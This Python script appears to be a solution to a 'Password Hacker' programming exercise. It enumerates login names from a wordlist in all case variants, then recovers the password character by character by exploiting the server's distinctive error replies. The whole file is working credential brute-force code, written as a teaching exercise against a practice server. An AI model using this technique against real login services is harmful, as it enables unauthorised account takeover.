import json
import sys
import socket
import itertools
import string

args = sys.argv

letters = string.ascii_uppercase + string.ascii_lowercase + string.digits


def generator():
    for letter in letters:
        yield letter


def all_possible_word_cases(word):
    return list(map(lambda x: "".join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in word))))


def login_brute():
    with open("C:\\Users\\Seara\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt") as f:
        for line in f:
            word = line.strip()
            for case in all_possible_word_cases(word):
                json_dict["login"] = case
                msg = json.dumps(json_dict)
                client_socket.send(msg.encode())
                response = client_socket.recv(1024)
                if json.loads(response.decode())["result"] == "Wrong password!":
                    return


def password_brute():
    for letter in generator():
        json_dict["password"] = json_dict["password"] + letter
        msg = json.dumps(json_dict)
        client_socket.send(msg.encode())
        response = client_socket.recv(1024)
        if json.loads(response.decode())["result"] == "Exception happened during login":
            return False

        elif json.loads(response.decode())["result"] == "Connection success!":
            return True

        json_dict["password"] = json_dict["password"][:-1]


with socket.socket() as client_socket:
    ip_address, port = args[1:]
    client_socket.connect((ip_address, int(port)))
    json_dict = {"login": " ", "password": " "}

    login_brute()

    json_dict["password"] = ""
    while True:
        result = password_brute()

        if result:
            break
print(json.dumps(json_dict))
